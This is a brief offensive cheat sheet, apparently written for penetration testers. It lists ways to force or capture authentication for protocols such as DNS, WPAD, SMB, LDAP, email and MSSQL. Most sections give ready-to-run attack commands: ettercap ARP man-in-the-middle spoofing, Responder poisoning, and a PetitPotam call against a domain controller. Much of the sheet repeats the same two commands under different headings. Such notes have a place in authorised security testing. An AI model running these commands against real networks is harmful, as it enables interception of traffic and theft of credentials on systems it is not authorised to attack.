### **1. MDNS (Multicast DNS)**
- **Triggering Method:**
  - **Broadcast Requests:** Some devices automatically send MDNS requests. No direct coercion possible unless controlling the device config.

### **2. DNS (Fake DNS Responses)**
- **Coercion Technique:** Use ARP or DHCP spoofing to make your machine the default DNS server. Redirect legitimate DNS requests.
  - **Command:** 
    ```bash
    ettercap -T -q -i eth0 -M arp /target_ip/ /gateway_ip/
    ```
  - **Command (Responder):** 
    ```bash
    responder -I eth0 -wrf
    ```

### **3. WPAD (Web Proxy Auto-Discovery)**
- **Coercion Technique:** Exploit WPAD requests automatically made by clients.
  - **Command:** 
    ```bash
    responder -I eth0 -wrf
    ```

### **4. HTTP/HTTPS (Serve Fake Web Pages)**
- **Coercion Technique:** Use DNS spoofing to redirect HTTP/HTTPS traffic to your machine.
  - **Command:** 
    ```bash
    ettercap -T -q -i eth0 -M arp /target_ip/ /gateway_ip/
    ```
  - **Command (Responder):** 
    ```bash
    responder -I eth0 -wrf
    ```

### **5. SMB (Server Message Block Capture)**
- **Coercion Technique:** Use LLMNR/NBT-NS poisoning or PetitPotam to force SMB authentication.
  - **Command (LLMNR/NBT-NS):** 
    ```bash
    responder -I eth0 -wrf
    ```
  - **Command (PetitPotam):** 
    ```bash
    python3 PetitPotam.py -u "" -p '' -d target.domain -dc-ip 192.168.1.1 -pipe lsarpc
    ```

### **6. LDAP (Lightweight Directory Access Protocol)**
- **Coercion Technique:** Redirect LDAP authentication requests via ARP or DNS spoofing.
  - **Command:** 
    ```bash
    ettercap -T -q -i eth0 -M arp /target_ip/ /gateway_ip/
    ```
  - **Command (Responder):** 
    ```bash
    responder -I eth0 -wrf
    ```

### **7. FTP/POP3/IMAP/SMTP (Email and File Transfer Protocols)**
- **Coercion Technique:** Disrupt service or redirect traffic via ARP/DNS spoofing.
  - **Command:** 
    ```bash
    ettercap -T -q -i eth0 -M arp /target_ip/ /gateway_ip/
    ```
  - **Command (Responder):** 
    ```bash
    responder -I eth0 -wrf
    ```

### **8. SQL (MSSQL)**
- **Coercion Technique:** Redirect MSSQL server requests using DNS/ARP spoofing.
  - **Command:** 
    ```bash
    ettercap -T -q -i eth0 -M arp /target_ip/ /gateway_ip/
    ```
  - **Command (Responder):** 
    ```bash
    responder -I eth0 -wrf
    ```